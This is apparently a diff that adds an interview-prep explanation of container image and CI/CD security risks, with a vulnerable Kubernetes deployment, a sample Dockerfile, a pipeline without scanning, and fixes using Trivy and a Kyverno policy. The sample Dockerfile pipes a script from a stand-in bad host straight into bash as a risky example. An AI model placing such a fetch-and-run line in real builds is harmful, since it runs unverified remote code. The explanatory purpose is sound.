@@ -276,5 +276,199 @@ This example is **realistic, common**, and **highly valued** in Wiz interviews b
 * Real data exposure risk
 * How Wiz connects attack paths that other tools miss
 
-Would you like me to zip this up into a deployable IRSA + pod example for practice or demo?
+Absolutely — let’s walk through a practical **CI/CD & Image Security scenario** that tools like **Wiz** are built to detect and prioritize:
+
+---
+
+# 🔐 CI/CD & Image Security Example
+
+### ⚠️ Problem:
+
+A developer pushes a container to production with:
+
+* A **vulnerable base image** (with CVEs)
+* Pulled from an **untrusted public registry**
+* No image scanning or deployment policy to block it
+
+---
+
+## 🛠️ Scenario Breakdown
+
+```
+Dev pushes image → Built with vulnerable Alpine → Pulled from Docker Hub → No admission control → Deployed to cluster
+```
+
+---
+
+## 1️⃣ Vulnerable Deployment YAML
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: cve-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: cve-app
+  template:
+    metadata:
+      labels:
+        app: cve-app
+    spec:
+      containers:
+      - name: vulnerable-container
+        image: docker.io/library/alpine:3.10
+        command: ["sh", "-c", "sleep 3600"]
+```
+
+### 🔎 What’s wrong:
+
+* `alpine:3.10` is **old and has critical CVEs** (e.g., musl, openssl bugs)
+* From public Docker Hub (`docker.io/library`)
+* No label or signature verification
+* No runtime admission check
+
+✅ **Wiz will scan the image registry**, detect:
+
+* CVEs based on known vulnerabilities
+* Untrusted source (public registry)
+* No SBOM, signature, or policy enforcement
+
+---
+
+## 2️⃣ Helm/CI Build Pulling Image from Untrusted Source
+
+Sample Dockerfile:
+
+```Dockerfile
+FROM alpine:3.10
+
+RUN apk add --no-cache curl bash && \
+    curl -s https://badsite.xyz/install.sh | bash
+
+CMD ["sleep", "3600"]
+```
+
+This does 3 risky things:
+
+* Uses old Alpine
+* Installs unverified shell script
+* No lockfile or hash pinning
+
+---
+
+## 3️⃣ No Image Scanning in CI (GitHub Actions)
+
+```yaml
+name: Build & Push
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Build Docker Image
+      run: docker build -t my-org/cve-app:latest .
+    - name: Push to Registry
+      run: docker push my-org/cve-app:latest
+```
+
+> ⚠️ This build pipeline lacks:
+
+* Image scanning (Trivy, Grype, etc.)
+* SBOM generation
+* Registry validation
+* Signature signing (cosign/sigstore)
+
+---
+
+## 🧠 How Wiz Helps
+
+Wiz scans both:
+
+1. **Image registries** — to find CVEs, untrusted origins, unscanned images
+2. **Running workloads** — to link images to real risk paths
+
+Then it **prioritizes risks** like:
+
+* Image with CVEs deployed in production
+* Pod with access to secrets or cloud IAM roles
+* Workload with outbound internet → vulnerable app
+
+---
+
+## 🛡️ How to Fix
+
+### ✔️ Use Trusted Base Images
+
+Replace Alpine 3.10 with an LTS minimal image:
+
+```Dockerfile
+FROM cgr.dev/chainguard/alpine-base:latest
+```
+
+Or:
+
+```Dockerfile
+FROM gcr.io/distroless/static:nonroot
+```
+
+---
+
+### ✔️ Enforce Image Scanning in CI
+
+Example using **Trivy** in GitHub Actions:
+
+```yaml
+- name: Scan image with Trivy
+  uses: aquasecurity/trivy-action@master
+  with:
+    image-ref: my-org/cve-app:latest
+    format: table
+```
+
+---
+
+### ✔️ Use Admission Controller (Kyverno or Gatekeeper)
+
+Block risky images at deploy time:
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: block-untrusted-registry
+spec:
+  validationFailureAction: enforce
+  rules:
+    - name: validate-registry
+      match:
+        resources:
+          kinds:
+            - Pod
+      validate:
+        message: "Only images from internal registry are allowed"
+        pattern:
+          spec:
+            containers:
+              - image: "my-registry.myorg.com/*"
+```
+
+---
+
+### 🧠 Bonus: What Wiz Surfaces
+
+> “This pod runs a container built from `docker.io/alpine:3.10`, with critical CVEs (CVSS > 9.0), deployed in the production namespace, and has access to an AWS role with S3 read/write.”
+
+⚠️ That’s an **exploitable path** — not just a vulnerability. That’s what sets Wiz apart.
+
+---
+
+
 
